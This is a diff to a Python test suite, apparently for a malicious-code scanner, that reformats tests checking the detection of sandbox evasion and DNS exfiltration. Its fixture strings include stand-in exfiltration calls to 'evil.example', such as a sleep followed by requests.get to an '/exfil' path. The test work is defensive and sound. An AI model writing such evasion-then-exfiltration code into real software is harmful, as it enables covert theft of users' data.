@@ -649,10 +649,16 @@ def test_anti_analysis_combo_binds_suspicious_side():
     # endpoint reopens instead of riding the unchanged sleep/trace line.
     old = "import time, requests\ntime.sleep(600)\nrequests.get('http://old.example')\n"
     new = "import time, requests\ntime.sleep(600)\nrequests.get('http://evil.example/exfil')\n"
-    fo = [f for f in sp.check_py_file(old, "p/x.py", "p")
-          if f.check == "Anti-analysis/sandbox evasion + suspicious behavior"]
-    fn = [f for f in sp.check_py_file(new, "p/x.py", "p")
-          if f.check == "Anti-analysis/sandbox evasion + suspicious behavior"]
+    fo = [
+        f
+        for f in sp.check_py_file(old, "p/x.py", "p")
+        if f.check == "Anti-analysis/sandbox evasion + suspicious behavior"
+    ]
+    fn = [
+        f
+        for f in sp.check_py_file(new, "p/x.py", "p")
+        if f.check == "Anti-analysis/sandbox evasion + suspicious behavior"
+    ]
     assert fo and fn
     assert "Network:" in fo[0].evidence
     assert sp._finding_key(fo[0]) != sp._finding_key(fn[0])
@@ -663,10 +669,16 @@ def test_dns_exfil_combo_binds_other_side():
     # endpoint reopens instead of riding the unchanged DNS line.
     old = "import dns.resolver\ndns.resolver.resolve('x.old.com','TXT')\nrequests.get('http://old.example')\n"
     new = "import dns.resolver\ndns.resolver.resolve('x.old.com','TXT')\nrequests.get('http://evil.example/x')\n"
-    fo = [f for f in sp.check_py_file(old, "p/d.py", "p")
-          if f.check == "DNS exfiltration / tunneling patterns"]
-    fn = [f for f in sp.check_py_file(new, "p/d.py", "p")
-          if f.check == "DNS exfiltration / tunneling patterns"]
+    fo = [
+        f
+        for f in sp.check_py_file(old, "p/d.py", "p")
+        if f.check == "DNS exfiltration / tunneling patterns"
+    ]
+    fn = [
+        f
+        for f in sp.check_py_file(new, "p/d.py", "p")
+        if f.check == "DNS exfiltration / tunneling patterns"
+    ]
     assert fo and fn
     assert sp._finding_key(fo[0]) != sp._finding_key(fn[0])
 
